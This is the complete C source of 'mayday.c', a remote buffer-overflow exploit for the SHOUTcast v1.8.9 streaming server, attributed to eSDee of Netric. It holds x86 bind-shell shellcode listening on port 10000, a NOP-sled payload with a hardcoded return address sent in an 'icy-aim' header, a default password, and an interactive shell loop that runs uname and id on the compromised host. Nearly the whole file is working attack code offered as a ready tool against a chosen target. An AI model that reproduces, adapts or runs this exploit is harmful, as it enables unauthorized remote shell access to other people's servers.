/*           _ ________            _____                        ______
 *  __ ___ ____       /____.------`    /_______.------.___.----`  ___/____ _______
 *       _/    \ _   /\   __.  __//   ___/_    ___.  /_\    /_    |     _/
 * ___ ._\    . \\  /__  _____/ _    /     \_  |    /__      |   _| slc | _____ _
 *    - -------\______||--._____\---._______//-|__    //-.___|----._____||
 * mayday.c - SHOUTcast v1.8.9 remote exploit   / \  / "Never trust a DJ"
 * by eSDee of Netric (www.netric.org)             \/
 *
 * Tested on:
 * - Redhat 7.x
 * - Redhat 6.x
 * - Suse 6.x
 * - Suse 7.x
 *
 * More information about this bug can be found at:
 * http://www.netric.org/advisories/netric-adv006.txt
 *
 */

#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <getopt.h>

char shellcode[] =  /* binds to port 10000 by Bighawk */
        "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd"
        "\x80\x89\xc7\x52\x66\x68\x27\x10\x43\x66\x53\x89\xe1\x6a\x10"
        "\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50"
        "\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f"
        "\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
        "\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

int sock;
void usage();
void shell();

int
main (int argc,char *argv[])
{
        char buf1[1130];
        char buf2[1800];
        char host[256];
        char pass[256]="changeme";

        int i=0;
        int c=0;
        int port=8001;
        unsigned int ret = 0x08069687;

        fprintf(stdout,"SHOUTcast v1.8.9 remote exploit by eSDee of Netric\n");
        fprintf(stdout,"-----------------------------------(www.netric.org)\n");

        while((c=getopt(argc,argv,"t:p:a:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(pass,0x0,sizeof(pass));
                                strncpy(pass,optarg,sizeof(pass) - 1);
                                break;
                        case 't':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;
                        default:
                                usage(argv[0]);
                                exit(1);
                                break;
                }
        }


        if (strlen(host) == 0) {
                usage(argv[0]);
                exit(1);
        }
        sock=openhost(host, port);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

        write(sock, pass, strlen(pass));
        write(sock, "\n", 1);

        memset(buf2,  0x0, sizeof(buf2));
        memset(buf1, 0x90, sizeof(buf1));

        for(i=0;i < strlen(shellcode); i++) buf1[i+600] = shellcode[i];

        buf1[759] = (ret & 0x000000ff);
        buf1[760] = (ret & 0x0000ff00) >> 8;
        buf1[761] = (ret & 0x00ff0000) >> 16;
        buf1[762] = (ret & 0xff000000) >> 24;

        buf1[1120] = 0x0;

        sprintf(buf2,   "icy-name: netric\r\n"
                        "icy-aim: %s\r\n"
                        "\r\n", buf1);

        fprintf(stdout, "Connected, sending code...\n");
        fprintf(stdout, "Ret: 0x%08x\n", ret);

        write(sock, buf2, strlen(buf2));
        sleep(2);
        close(sock);

        sock=openhost(host, 10000);

        if (sock==-1) {
                fprintf(stderr, "Exploit failed!\n\n");
                exit(1);
        }

        fprintf(stdout, "Exploiting succesful.\n");
        fprintf(stdout, "---------------------------------------------------\n");
        shell();
        return 0;
}

void
usage(char *prog)
{
        fprintf(stderr,"Usage: %s -t [-pa]\n",prog);
        fprintf(stderr,"-t target       The host to attack.\n");
        fprintf(stderr,"-a password     Default password is \"changeme\".\n");
        fprintf(stderr,"-p port         Default port is 8001.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
        return sock;
}

void shell() /* taken from an old wuftp exploit */
{
        fd_set  fd_read;
        char buff[1024], *cmd="/bin/uname -a;/usr/bin/id;\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);
        while(1) {
                FD_SET(sock,&fd_read);
                FD_SET(0,&fd_read);
                if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
                if( FD_ISSET(sock, &fd_read) ) {
                        if((n=recv(sock,buff,sizeof(buff),0))<0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }
                        if(write(1,buff,n)<0)break;
                }

                if ( FD_ISSET(0, &fd_read) ) {
                        if((n=read(0,buff,sizeof(buff)))<0){
                                fprintf(stderr,"EOF\n");
                                exit(2);
                        }
                        if(send(sock,buff,n,0)<0) break;
                }
                usleep(10);
                }
                fprintf(stderr,"Connection lost.\n");
                exit(0);
}
